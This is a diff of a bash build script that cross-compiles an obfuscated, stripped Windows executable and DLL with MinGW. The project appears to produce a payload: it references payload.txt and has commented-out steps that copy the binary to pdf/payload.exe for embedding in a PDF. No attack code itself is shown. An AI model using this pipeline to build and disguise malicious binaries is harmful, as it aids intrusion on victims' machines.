@@ -58,6 +58,7 @@ if [[ "$PRIORIZE_SIZE" == "true" ]]; then
 else
     STDLIB=""
     ICON="build/icon.o"
+    SRC+=("build/icon.o")
     ENTRYPOINT="WinMain"
 fi
 
@@ -65,16 +66,17 @@ fi
 CC="x86_64-w64-mingw32-gcc"
 CFLAGS=($STDLIB -Ibuild -Wall -Wextra -Os -O2 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing -ffreestanding)
 WARNINGS=(-Wtype-limits -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes)
-LIBS=(-lmingw32 -lkernel32 -lntdll -luser32 -ladvapi32 -lshell32 -lwininet -lm -lgcc)
+LIBS=(-lkernel32 -luser32 -ladvapi32 -lshell32 -lm -lgcc)
 OBFUSCATION=(-s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident)
 LDFLAGS=(-Wl,--gc-sections,--entry=$ENTRYPOINT,--disable-auto-import,--no-insert-timestamp)
 
+
 # Create necessary directories
 mkdir -p bin build
-cp src/* build/
-cp asm/* build/
+cp src/* dll/* build/
+
+# Sed everything and compile the dll
 python3 main.py $VERBOSE $PRIORIZE_SIZE
-# rm build/payload.txt
 
 # Compile the icon if necessary
 if [[ -n "$ICON" ]]; then
@@ -83,15 +85,20 @@ fi
 
 # Compile the program
 if [[ "$VERBOSE" == "true" ]]; then
-    echo -e "$CC ${CFLAGS[@]} ${WARNINGS[@]} ${SRC[@]} $ICON -static -static-libgcc -o bin/$OUTPUT_FILE ${LDFLAGS[@]} ${LIBS[@]} ${OBFUSCATION[@]}\n"
+    echo -e "$CC ${CFLAGS[@]} ${WARNINGS[@]} ${SRC[@]} -static -static-libgcc -o bin/$OUTPUT_FILE ${LDFLAGS[@]} ${LIBS[@]} ${OBFUSCATION[@]}\n"
 fi
 
-$CC "${CFLAGS[@]}" "${WARNINGS[@]}" "${SRC[@]}" "$ICON" -static -static-libgcc -o "bin/$OUTPUT_FILE" "${LDFLAGS[@]}" "${LIBS[@]}" "${OBFUSCATION[@]}"
+$CC "${CFLAGS[@]}" "${WARNINGS[@]}" "${SRC[@]}" -static -static-libgcc -o "bin/$OUTPUT_FILE" "${LDFLAGS[@]}" "${LIBS[@]}" "${OBFUSCATION[@]}"
 
+if [ $? -eq 0 ]; then
+    
+    # Post-build
+    cp -f bin/$OUTPUT_FILE ../../sandbox/
+    # cp bin/$OUTPUT_FILE pdf/payload.exe
+    # ./pdf/create.sh
 
-# Post-build
-cp -f bin/$OUTPUT_FILE ../../sandbox/
-# cp bin/$OUTPUT_FILE pdf/payload.exe
-# ./pdf/create.sh
-
-echo "Build completed. Output file: bin/$OUTPUT_FILE"
+    echo "Build completed. Output file: bin/$OUTPUT_FILE (size: $(du -h bin/$OUTPUT_FILE | cut -f1))"
+else
+    echo "Compilation failed."
+    exit 1
+fi
